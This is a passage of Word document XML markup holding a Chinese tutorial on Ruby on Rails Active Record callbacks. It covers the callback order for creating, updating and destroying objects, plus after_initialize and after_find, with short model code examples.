              <w:t>before_validation</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> :ensure_login_has_a_value</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="168F20D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0BEC3A9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protected</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="009176B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ensure_login_has_a_value</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6783667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if</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>login.nil?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36FE372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self.login = email unless</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>email.blank?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51977FC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3C0DEB9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7D146BE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291E46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而 macro-style 类方法也</w:t>
      </w:r>
      <w:r w:rsidRPr="00A1468F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>可以接受 block</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="00A1468F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>当 block 中的代码比较少的时候可以考虑使用</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7536"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="36814F92" w14:textId="77777777" w:rsidTr="00A1468F">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="31F3A78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User &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B6F69D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validates :login, :email, :presence</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C3B847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0255A7B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A1468F">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>before_create</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> do</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|user|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B0FF33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user.name = user.login.capitalize if</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>user.name.blank?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DF1853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5590FE8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19D6554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一般认为</w:t>
      </w:r>
      <w:r w:rsidRPr="00A1468F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>将回调方法声明为 protected 或者 private 是比较好的</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>实践。因为</w:t>
      </w:r>
      <w:r w:rsidRPr="00A1468F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>一旦我们声明为 public 时，该方法就可以直接在模型外调用，而这破坏了对象封装的原则</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E934CD4"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11 有效的回调</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F7436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下面列出了 Acrive Record 中所有的回调，同类型的多个回调其各自的调用顺序如下所示的排列次序：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE1667D"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11.1 创建对象时</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4525995C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00541430">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before_validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E7930FE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00541430">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after_validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2999E2AE" w14:textId="77777777" w:rsidR="00541430" w:rsidRPr="002A2B82" w:rsidRDefault="00541430" w:rsidP="00541430">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A59608F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00541430">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before_save</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71DA1115" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00541430">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around_save</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66011C08" w14:textId="77777777" w:rsidR="00541430" w:rsidRPr="002A2B82" w:rsidRDefault="00541430" w:rsidP="00541430">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55CE493D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00541430">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before_create</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65DC97AD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00541430">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around_create</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AB3C4FA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00541430">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after_create</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="539D461E" w14:textId="77777777" w:rsidR="00541430" w:rsidRPr="002A2B82" w:rsidRDefault="00541430" w:rsidP="00541430">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D9891B3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00541430">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after_save</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211A4291"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11.2 更新对象时</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0778738B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00541430">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before_validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F55E2F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00541430">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after_validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5397E1F0" w14:textId="77777777" w:rsidR="00541430" w:rsidRPr="002A2B82" w:rsidRDefault="00541430" w:rsidP="00541430">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A2AFDE1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00541430">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before_save</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E5A5B2F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00541430">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around_save</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04C38364" w14:textId="77777777" w:rsidR="00541430" w:rsidRPr="002A2B82" w:rsidRDefault="00541430" w:rsidP="00541430">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B68E7A0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00541430">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before_update</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="628ABEE3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00541430">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around_update</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FC9FB87" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00541430">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after_update</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B944694" w14:textId="77777777" w:rsidR="00541430" w:rsidRPr="002A2B82" w:rsidRDefault="00541430" w:rsidP="00541430">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02C36DEC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00541430">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after_save</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E5C9E39"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11.3 销毁对象时</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622EBFFB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>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before_destroy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3687F7C5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>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around_destroy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19391683" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>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after_destroy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E21602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after_save</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在创建和更新对象是都会运行，但总是在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>after_create</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>after_update</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 之后，而和通过宏注册时的顺序无管。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21738E38"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 xml:space="preserve">11.4 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>after_initialize</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>after_find</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6923B516"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C4688F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>after_initialize</w:t>
      </w:r>
      <w:r w:rsidRPr="00C4688F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在 Active Record 对象被实例化时调用，无论是通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="00C4688F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r w:rsidRPr="00C4688F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来新建一个对象还是从数据库中载入一个对象</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。这个方法非常有用，因为可以避免你直接重写 Active Record 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>initialize</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E6F66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55025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>after_find</w:t>
      </w:r>
      <w:r w:rsidRPr="0055025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在从数据库载入 Active Record 对象时被调用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="0055025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">当 </w:t>
      </w:r>
      <w:r w:rsidRPr="0055025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>after_find</w:t>
      </w:r>
      <w:r w:rsidRPr="0055025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="0055025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>after_initialize</w:t>
      </w:r>
      <w:r w:rsidRPr="0055025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 同时声明时，</w:t>
      </w:r>
      <w:r w:rsidRPr="0055025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>after_find</w:t>
      </w:r>
      <w:r w:rsidRPr="0055025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将首先被调用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C88302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55025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>after_initialize</w:t>
      </w:r>
      <w:r w:rsidRPr="0055025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="0055025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>after_find</w:t>
      </w:r>
      <w:r w:rsidRPr="0055025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 回调没有与之对用的 </w:t>
      </w:r>
      <w:r w:rsidRPr="0055025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>before_*</w:t>
      </w:r>
      <w:r w:rsidRPr="0055025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 回调</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="0055025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>但他们也是和其他 Active Record 回调一样注册使用</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5736"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="32803B17" w14:textId="77777777" w:rsidTr="0055025F">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1FAC145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User &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27964FF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55025F">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>after_initialize</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
